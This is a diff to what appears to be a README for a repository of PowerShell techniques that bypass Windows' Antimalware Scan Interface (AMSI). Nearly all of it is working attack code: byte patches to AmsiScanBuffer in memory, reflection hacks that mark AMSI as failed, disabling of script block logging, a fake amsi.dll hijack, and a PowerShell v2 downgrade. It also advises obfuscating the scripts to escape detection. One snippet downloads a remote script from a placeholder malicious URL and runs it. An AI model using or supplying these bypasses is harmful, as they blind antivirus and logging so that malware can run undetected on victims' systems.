@@ -1,7 +1,25 @@
-# Amsi-Bypass-Powershell
-This repo contains some Amsi Bypass methods i found on different Blog Posts.
+# Amsi-Bypass-Powershell #
+This repo contains some Antimalware Scan Interface (AMSI) bypass / avoidance methods i found on different Blog Posts.
 
-## 1) Patching amsi.dll AmsiScanBuffer by rasta-mouse
+Most of the scripts are detected by AMSI itself. So you have to find the [trigger](https://github.com/RythmStick/AMSITrigger) and change the signature at the part via variable/function renaming, string replacement or encoding and decoding at runtime. Alternatively obfuscate them via ISESteroids and or Invoke-Obfuscation to get them working.
+
+1. [Patching amsi.dll AmsiScanBuffer by rasta-mouse](#Patching-amsi.dll-AmsiScanBuffer-by-rasta-mouse "Goto Patching-amsi.dll-AmsiScanBuffer-by-rasta-mouse")
+2. [Dont use net webclient](#Dont-use-net-webclient "Goto Dont-use-net-webclient") - this one is not working anymore
+3. [Amsi ScanBuffer Patch from -> https://www.contextis.com/de/blog/amsi-bypass](#Amsi-ScanBuffer-Patch "Goto Amsi-ScanBuffer-Patch")
+4. [Forcing an error](#Forcing-an-error "Goto Forcing-an-error")
+5. [Disable Script Logging](#Disable-Script-Logging "Goto Disable-Script-Logging")
+6. [Amsi Buffer Patch - In memory](#Amsi-Buffer-Patch---In-memory "Goto Amsi-Buffer-Patch---In-memory")
+7. [Same as 6 but integer Bytes instead of Base64](#Same-as-6-but-integer-Bytes-instead-of-Base64 "Goto Same-as-6-but-integer-Bytes-instead-of-Base64")
+8. [Using Matt Graeber's Reflection method](#Using-Matt-Graebers-Reflection-method "Goto Using-Matt-Graebers-Reflection-method")
+9. [Using Matt Graeber's Reflection method with WMF5 autologging bypass](#Using-Matt-Graebers-Reflection-method-with-WMF5-autologging-bypass "Goto Using-Matt-Graebers-Reflection-method-with-WMF5-autologging-bypass")
+10. [Using Matt Graeber's second Reflection method](#Using-Matt-Graebers-second-Reflection-method "Goto Using-Matt-Graebers-second-Reflection-method")
+11. [Using Cornelis de Plaa's DLL hijack method](#Using-Cornelis-de-Plaas-DLL-hijack-method "Goto Using-Cornelis-de-Plaas-DLL-hijack-method")
+12. [Use Powershell Version 2 - No AMSI Support there](#Using-PowerShell-version-2 "Goto Using-PowerShell-version-2")
+13. [Nishang all in one](#Nishang-all-in-one "Goto Nishang-all-in-one")
+14. [Adam Chesters Patch](#Adam-Chester-Patch "Goto Adam-Chester-Patch")
+
+
+# Patching amsi.dll AmsiScanBuffer by rasta-mouse #
 ```
 $Win32 = @"
 
@@ -32,7 +50,7 @@ $Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
 [System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)
 ```
 
-## 2) Dont use net webclient
+# Dont use net webclient # - Not Working anymore, there was a patch for it
 
     $webreq = [System.Net.WebRequest]::Create(‘https://maliciousscripturl/malicious.ps1’)
 
@@ -46,7 +64,14 @@ $Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
 
     IEX($content)
 
-## 3) Amsi ScanBuffer Patch from -> https://www.contextis.com/de/blog/amsi-bypass
+# The Short version of dont use powershell net webclient - Not Working anymore, there was a patch for it
+```
+IEX([Net.Webclient]::new().DownloadString("https://maliciousscripturl/malicious.ps1"))
+```
+# Amsi ScanBuffer Patch #
+
+Egghunter with blog post: https://www.contextis.com/us/blog/amsi-bypass
+
 ```
 Write-Host "-- AMSI Patch"
 Write-Host "-- Paul Laîné (@am0nsec)"
@@ -135,13 +160,13 @@ $a = 0
 [Kernel32]::VirtualProtect($targetedAddress, [uint32]2, $oldProtectionBuffer, [ref]$a) | Out-Null
 
 ```
-## 4) Forcing an error
+# Forcing an error #
 ```
 $mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(9076)
 
 [Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiSession","NonPublic,Static").SetValue($null, $null);[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiContext","NonPublic,Static").SetValue($null, [IntPtr]$mem)
 ```
-## 5) Disable Script Logging
+# Disable Script Logging #
 ```
 $settings = [Ref].Assembly.GetType("System.Management.Automation.Utils").GetField("cachedGroupPolicySettings","NonPublic,Static").GetValue($null);
 $settings["HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"] = @{}
@@ -151,7 +176,7 @@ $settings["HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\Scr
 [Ref].Assembly.GetType("System.Management.Automation.ScriptBlock").GetField("signatures","NonPublic,static").SetValue($null, (New-Object 'System.Collections.Generic.HashSet[string]'))
 ```
 
-## 6) Amsi Buffer Patch - In memory 
+# Amsi Buffer Patch - In memory # 
 ```
 function Bypass-AMSI
 {
@@ -161,7 +186,7 @@ function Bypass-AMSI
     [Bypass.AMSI]::Patch()
 }
 ```
-## 7) Same as 4 but integer Bytes instead of Base64
+# Same as 6 but integer Bytes instead of Base64 #
 
 ```
 function MyPatch{
@@ -175,8 +200,57 @@ function MyPatch{
 MyPatch;
 Start-Sleep 1;
 ```
+# Using Matt Graebers Reflection method #
+```
+[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+```
+# Using Matt Graebers Reflection method with WMF5 autologging bypass #
+```
+[Delegate]::CreateDelegate(("Func``3[String, $(([String].Assembly.GetType('System.Reflection.Bindin'+'gFlags')).FullName), System.Reflection.FieldInfo]" -as [String].Assembly.GetType('System.T'+'ype')), [Object]([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')),('GetFie'+'ld')).Invoke('amsiInitFailed',(('Non'+'Public,Static') -as [String].Assembly.GetType('System.Reflection.Bindin'+'gFlags'))).SetValue($null,$True)
+```
 
-## 8) Nishang all in one
+# Using Matt Graebers second Reflection method #
+```
+[Runtime.InteropServices.Marshal]::WriteInt32([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiContext',[Reflection.BindingFlags]'NonPublic,Static').GetValue($null),0x41414141)
+```
+
+# Using Cornelis de Plaas DLL hijack method #
+```
+[Byte[]] $temp = $DllBytes -split ' '                
+Write-Output "Executing the bypass."
+Write-Verbose "Dropping the fake amsi.dll to disk."
+[System.IO.File]::WriteAllBytes("$pwd\amsi.dll", $temp)
+
+Write-Verbose "Copying powershell.exe to the current working directory."
+Copy-Item -Path C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Destination $pwd
+
+Write-Verbose "Starting powershell.exe from the current working directory."
+& "$pwd\powershell.exe"
+```
+# Using PowerShell version 2 #
+```
+if ($ShowOnly -eq $True)
+{
+        Write-Output "If .Net version 2.0.50727 is installed, run powershell -v 2 and run scripts from the new PowerShell process."
+}
+else
+{
+        Write-Verbose "Checking if .Net version 2.0.50727 is installed."
+        $versions = Get-ChildItem 'HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP' -recurse | Get-ItemProperty -name Version -EA 0 | Where { $_.PSChildName -match '^(?!S)\p{L}'} | Select -ExpandProperty Version
+	if($versions -match "2.0.50727")
+	{
+        	Write-Verbose ".Net version 2.0.50727 found."
+        	Write-Output "Executing the bypass."
+        	powershell.exe -version 2
+	}
+	else
+	{
+        	Write-Verbose ".Net version 2.0.50727 not found. Can't start PowerShell v2."
+	}
+}
+```
+
+# Nishang all in one #
 ```
 function Invoke-AmsiBypass
 {
@@ -566,3 +640,74 @@ Sv  ('R9'+'HYt') ( " ) )93]rahC[]gnirtS[,'UCS'(ecalpeR.)63]rahC[]gnirtS[,'aEm'(e
 
 }
 ```
+
+
+# Adam Chester Patch #
+Bypass Update by Adam Chester https://twitter.com/_xpn_/status/1170852932650262530
+```
+$Winpatch = @"
+using System;
+using System.Runtime.InteropServices;
+
+public class patch
+{
+    // https://twitter.com/_xpn_/status/1170852932650262530
+    static byte[] x64 = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
+    static byte[] x86 = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };
+
+    public static void it()
+    {
+        if (is64Bit())
+            PatchAmsi(x64);
+        else
+            PatchAmsi(x86);
+    }
+
+    private static void PatchAmsi(byte[] patch)
+    {
+        try
+        {
+            var lib = Win32.LoadLibrary("a" + "ms" + "i.dll");
+            var addr = Win32.GetProcAddress(lib, "AmsiScanBuffer");
+
+            uint oldProtect;
+            Win32.VirtualProtect(addr, (UIntPtr)patch.Length, 0x40, out oldProtect);
+
+            Marshal.Copy(patch, 0, addr, patch.Length);
+            Console.WriteLine("Patch Sucessfull");
+        }
+        catch (Exception e)
+        {
+            Console.WriteLine(" [x] {0}", e.Message);
+            Console.WriteLine(" [x] {0}", e.InnerException);
+        }
+    }
+
+    private static bool is64Bit()
+        {
+            bool is64Bit = true;
+
+            if (IntPtr.Size == 4)
+                is64Bit = false;
+
+            return is64Bit;
+        }
+}
+
+class Win32
+{
+    [DllImport("kernel32")]
+    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+
+    [DllImport("kernel32")]
+    public static extern IntPtr LoadLibrary(string name);
+
+    [DllImport("kernel32")]
+    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+}
+"@
+
+Add-Type -TypeDefinition $Winpatch -Language CSharp
+[patch]::it()
+```
+
